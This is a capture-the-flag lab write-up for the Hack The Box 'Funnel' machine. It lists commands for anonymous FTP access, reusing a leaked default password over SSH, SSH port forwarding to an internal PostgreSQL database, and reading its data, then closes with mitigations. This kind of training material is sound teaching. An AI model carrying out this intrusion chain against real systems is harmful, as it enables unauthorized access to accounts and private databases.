# HTB Starting Point - Funnel

## Overview

Funnel is a Tier 1 Hack The Box Starting Point machine focused on FTP enumeration, information disclosure, credential discovery, SSH access, internal service enumeration, SSH tunneling, and PostgreSQL database enumeration.

The objective was to investigate an exposed FTP server, identify useful files, recover usernames and a default password, gain SSH access, discover an internal PostgreSQL service, create an SSH tunnel, access the database, and retrieve the flag.

This room demonstrated how exposed backup files and poor credential management can lead to unauthorized access to internal services.

---

## Skills Learned

- Service enumeration
- FTP enumeration
- Anonymous FTP access
- Information gathering
- SSH authentication
- Internal service enumeration
- SSH port forwarding
- PostgreSQL enumeration
- Database exploration

---

## Tools Used

- Nmap
- FTP Client
- SSH
- PostgreSQL Client (psql)

---

## Enumeration

### Service Discovery

I started by scanning the target machine to identify open ports and running services.

```bash
nmap -sV <target-ip>
```

### Results

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

### Findings

- FTP service exposed on port 21.
- SSH service exposed on port 22.
- Linux-based target identified.

Since FTP allowed file access, it became the initial target for further investigation.

---

## Anonymous FTP Access

### Command

```bash
ftp <target-ip>
```

### Credentials

```text
Username: anonymous
Password:
```

### Result

```text
230 Login successful.
```

### Findings

Anonymous FTP access was enabled.

This allowed unauthenticated users to browse files stored on the server.

---

## FTP Enumeration

### Command

```bash
ls
```

### Result

```text
mail_backup
```

### Findings

A directory named:

```text
mail_backup
```

was exposed through the FTP server.

The name suggested it could contain email backups or internal documentation.

---

## Exploring the Backup Directory

### Command

```bash
cd mail_backup
```

### Command

```bash
ls
```

### Result

```text
password_policy.pdf
welcome_28112022
```

### Findings

Two potentially valuable files were discovered:

- `password_policy.pdf`
- `welcome_28112022`

---

## Downloading the Files

### Commands

```bash
get password_policy.pdf
```

```bash
get welcome_28112022
```

### Result

Both files were downloaded successfully for local analysis.

---

## Reading the Welcome Email

### Command

```bash
cat welcome_28112022
```

### Findings

The email revealed multiple usernames:

```text
optimus
albert
andreas
christine
maria
```

It also referenced an internal infrastructure and instructed new users to review the password policy.

### Security Impact

Although no passwords were exposed directly, valid usernames were disclosed.

---

## Reading the Password Policy

### Command

```bash
pdftotext password_policy.pdf
```

### Command

```bash
cat password_policy.txt
```

### Findings

The document revealed an example default password:

```text
funnel123#!#
```

The policy stated:

```text
Default passwords — such as those created for new users — must be changed immediately.
```

### Important Observation

While intended as an example, the password appeared realistic enough to test against discovered user accounts.

---

## SSH Access

### Challenge Encountered

At this stage I had:

```text
Usernames
+
Default Password
```

but no confirmation that any credentials were valid.

### Command

```bash
ssh christine@<target-ip>
```

### Password

```text
funnel123#!#
```

### Result

```text
Welcome to Ubuntu 20.04.5 LTS
```

### Findings

Successfully authenticated as:

```text
christine
```

### Security Impact

Credential reuse allowed access to the system using information exposed through FTP backups.

---

## Local Enumeration

### Commands

```bash
whoami
```

```bash
pwd
```

```bash
ls -la
```

### Findings

The account had limited permissions.

A notable discovery was:

```text
.bash_history -> /dev/null
```

meaning shell history was intentionally discarded.

---

## Challenge Encountered

### Command

```bash
sudo -l
```

### Result

```text
Sorry, user christine may not run sudo on funnel.
```

### What I Learned

Compromising a user account does not necessarily lead to administrative privileges.

Additional enumeration was required.

---

## Discovering Internal Services

### Command

```bash
ss -tulpn
```

### Findings

A PostgreSQL service was discovered:

```text
127.0.0.1:5432
```

### Why This Was Important

The database service was not visible during the original Nmap scan because it was bound to localhost.

This meant the service could only be accessed from inside the system.

---

## SSH Port Forwarding

### Challenge Encountered

Although PostgreSQL was running, it was not externally accessible.

### Command

```bash
ssh -L 5432:127.0.0.1:5432 christine@<target-ip>
```

### What the Command Does

Creates a local tunnel between:

```text
Attacker Machine
↓
SSH Tunnel
↓
Internal PostgreSQL Service
```

### Result

The database became accessible locally.

---

## Verifying the Tunnel

### Command

```bash
nmap -sV -p 5432 localhost
```

### Result

```text
5432/tcp open postgresql PostgreSQL DB 15.0 - 15.1
```

### Findings

Successfully confirmed access to the internal PostgreSQL service.

---

## Accessing PostgreSQL

### Command

```bash
psql -h localhost -U christine
```

### Password

```text
funnel123#!#
```

### Result

Successfully connected to PostgreSQL.

### Findings

The same credentials used for SSH also worked for PostgreSQL.

This demonstrated credential reuse across services.

---

## Database Enumeration

### Command

```sql
\l
```

### Results

```text
christine
postgres
secrets
```

### Findings

A database named:

```text
secrets
```

immediately stood out as interesting.

---

## Connecting to the Secrets Database

### Command

```sql
\c secrets
```

### Result

```text
You are now connected to database "secrets"
```

### Findings

Database access obtained.

---

## Enumerating Tables

### Command

```sql
\dt
```

### Result

```text
public | flag | table | christine
```

### Findings

A table named:

```text
flag
```

was discovered.

---

## Retrieving the Flag

### Command

```sql
SELECT * FROM flag;
```

### Result

Flag successfully retrieved.

---

## Challenges Encountered

### Challenge 1: No Credentials Initially Available

**Problem**

Only FTP and SSH were visible.

**Solution**

Investigated exposed FTP content.

**Lesson Learned**

Files stored on publicly accessible services often contain valuable information.

---

### Challenge 2: Converting the PDF

**Problem**

The password policy was stored as a PDF.

**Solution**

Used:

```bash
pdftotext
```

to convert it into readable text.

**Lesson Learned**

Documents often contain security-related information worth reviewing during assessments.

---

### Challenge 3: Limited User Privileges

**Problem**

The compromised user account had no sudo access.

**Result**

```text
Sorry, user christine may not run sudo on funnel.
```

**Lesson Learned**

Not every successful compromise results in immediate privilege escalation.

---

### Challenge 4: Internal PostgreSQL Not Externally Accessible

**Problem**

The database was only listening on:

```text
127.0.0.1:5432
```

**Solution**

Used SSH port forwarding:

```bash
ssh -L 5432:127.0.0.1:5432 christine@<target-ip>
```

**Lesson Learned**

Internal services can often be reached through SSH tunneling after obtaining access to a system.

---

## Key Concepts

### Anonymous FTP

Allows users to access FTP resources without valid credentials.

### Information Disclosure

Exposure of usernames, passwords, internal emails, or documentation.

### Credential Reuse

Using the same credentials across multiple services.

### SSH Port Forwarding

A technique used to access internal services through an SSH tunnel.

### PostgreSQL

An open-source relational database management system.

### Database Enumeration

The process of identifying:

```text
Databases
↓
Tables
↓
Columns
↓
Records
```

to locate useful information.

---

## Security Lessons

### Vulnerabilities Identified

- Anonymous FTP Access
- Exposed Backup Files
- Username Disclosure
- Default Password Exposure
- Credential Reuse
- Internal Service Exposure

### Risks

- Unauthorized Access
- Account Compromise
- Internal Network Exposure
- Sensitive Data Disclosure

### Recommended Mitigations

- Disable anonymous FTP access.
- Restrict access to backup files.
- Enforce password rotation.
- Prevent password reuse across services.
- Limit access to internal services.

---

## Cybersecurity Relevance

This room is relevant to:

- Security Analyst
- SOC Analyst
- Penetration Testing
- Identity and Access Management
- Database Security

The techniques demonstrated in this room closely resemble real-world attack paths where exposed backups and weak credential management lead to broader system compromise.

---

## Key Takeaways

- Enumeration should always come first.
- Exposed backups often contain sensitive information.
- Password policies can reveal useful attack paths.
- Internal services may not be visible externally.
- SSH tunneling provides access to localhost-only services.
- Credential reuse significantly increases risk.

---

## Screenshots

1. Nmap Scan (`nmap-scan.png`)
2. Anonymous FTP Login (`ftp-anonymous-login.png`)
3. FTP Enumeration (`ftp-file-enumeration.png`)
4. Welcome Email (`welcome-email.png`)
5. Password Policy (`password-policy.png`)
6. SSH Access (`ssh-access.png`)
7. Internal Service Discovery (`internal-service-discovery.png`)
8. SSH Tunnel (`ssh-tunnel.png`)
9. PostgreSQL Discovery (`postgres-discovery.png`)
10. PostgreSQL Login (`postgres-login.png`)
11. Database Enumeration (`database-enumeration.png`)
12. Table Enumeration (`table-enumeration.png`)
13. Flag Retrieval (`flag.png`)

---

## Reflection

Funnel demonstrated how multiple low-severity issues can be chained together into a complete attack path. Anonymous FTP access exposed backup files containing usernames and password-related information. Those details led to SSH access, which allowed enumeration of internal services. By identifying PostgreSQL, creating an SSH tunnel, and navigating the database structure, it was possible to retrieve the flag. The room reinforced the importance of thorough enumeration and highlighted the risks associated with exposed backups and credential reuse.